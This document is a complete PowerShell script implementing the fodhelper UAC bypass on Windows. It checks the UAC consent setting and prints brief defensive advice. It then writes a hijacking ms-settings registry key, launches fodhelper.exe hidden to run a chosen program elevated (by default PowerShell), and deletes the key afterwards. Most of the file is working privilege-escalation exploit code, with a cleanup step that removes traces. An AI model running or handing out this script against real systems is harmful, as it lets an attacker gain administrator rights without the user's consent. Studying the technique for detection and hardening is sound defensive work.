Function Invoke-FodhelperBypass
{ 
    [CmdletBinding()]
        Param(
            [Parameter(
                Mandatory=$False,
                Position=0,
                ValueFromPipeLine=$True,
                ValueFromPipelineByPropertyName=$True,
                HelpMessage='Enter an executable you wish to execute to gain privesc. Default value is cmd /c start powershell.exe')]  # End Parameter
        [String]$Program = "cmd /c start powershell.exe")  # End param
 
    BEGIN 
    {
        
        $Value = Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "ConsentPromptBehaviorAdmin" | Select-Object -Property "ConsentPromptBehaviorAdmin"

        Switch ($Value.ConsentPromptBehaviorAdmin)
        {
            0 { $Message = "0 : Elevate without prompting" }
            1 { $Message = "1 : Prompt for credentials on the secure desktop" }
            2 { $Message = "2 : Prompt for consent on the secure desktop" }
            3 { $Message = "3 : Prompt for credentials"}
            4 { $Message = "4 : Prompt for consent"}
            5 { $Message = "5 : Prompt for consent for non-Windows binaries"}
        }  # End Switch

        If (($Value.ConsentPromptBehaviorAdmin -eq 1) -or ($Value.ConsentPromptBehaviorAdmin -eq 2))
        {

            Write-Host "This device is not vulnerable to the fodhelper UAC bypass method. `nUAC Settings: $Message" -ForegroundColor "Green"

            Pause
            
            Exit 

        }  # End If
        Else 
        {
            
            Write-Host "This device is vulnerable to the fodhelper bypass method. `nCurrent UAC Settings: $Message" -ForegroundColor "Yellow"

            Write-Host "To defend against the fodhelper UAC bypass there are 2 precautions to take.`n1.) Do not sign in with a user who is a member of the local administraors group. `n2.) Change HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System's values ConsentPromptBehaviorAdmin to a value of 1 or 2."

        }  # End Else

        Write-Verbose "Adding registry values..."
        
        New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\Command" -Force

        New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\Command" -Name "DelegateExecute" -Value "" -Force

        Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\Command" -Name "(default)" -Value $Program -Force

    }  # End BEGIN
    PROCESS 
    {
        
        Write-Verbose "Executing fodhelper.exe and $Program..."

        Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
        
    }  # End PROCESS 
    END 
    {

        Write-Verbose "Removing registry values as they should be no longer needed..."

        Start-Sleep -Seconds 3

        Remove-Item -Path "HKCU:\Software\Classes\ms-settings\" -Recurse -Force

    }  # End END

}  # End Function Invoke-FodHelperBypass
